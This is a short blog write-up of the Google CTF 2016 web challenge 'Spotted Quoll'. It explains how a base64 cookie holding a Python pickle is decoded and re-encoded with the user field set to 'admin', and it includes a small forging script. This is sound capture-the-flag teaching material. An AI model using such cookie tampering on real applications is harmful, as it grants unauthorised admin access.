---
source: zlz-buerhaus
source_url: https://buer.haus/2016/05/01/google-ctf-web-7-spotted-quoll
title: "Google CTF – Web 7 – Spotted Quoll | ziot"
---

[< Back](https://buer.haus/)

**Google CTF - Web 7 - Spotted Quoll**

![site](https://buer.haus/wp-content/uploads/2016/05/site3.png)

This was one of the easier challenges but it was still fun.

When you load the website, it sends an AJAX request to the following URL:

https://spotted-quoll.ctfcompetition.com/getCookie

This request sets a cookie:

```
Set-Cookie: obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu; Path=/
```

`
`

``

The first thing that jumped to mind is "pickle" and that the string is base64. Using base64 decode on the string shows the following:

```
(dp1
S'python'
p2
S'pickles'
p3
sS'subtle'
p4
S'hint'
p5
sS'user'
p6
Ns.
```

This is the format for Python's object format Pickle. Last year was the Year of Object Injection, so I'm sure many of the people participating in the CTF were aware of python pickle injection. The obvious thing that stands out is that the 'user' parameter has no value set. If we set the user value to 'admin', we most likely will beat the challenge.

A quick script showing how easy it is to load and dump Pickle objects:

```
import cPickle
import base64

test = cPickle.loads(base64.b64decode("KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu"))
test["user"] = "admin"

print(base64.b64encode(cPickle.dumps(test)))

# Output: KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKUydhZG1pbicKcDcKcy4=
```

Sending our new Pickle object:

![step 3](https://buer.haus/wp-content/uploads/2016/05/step-33.png)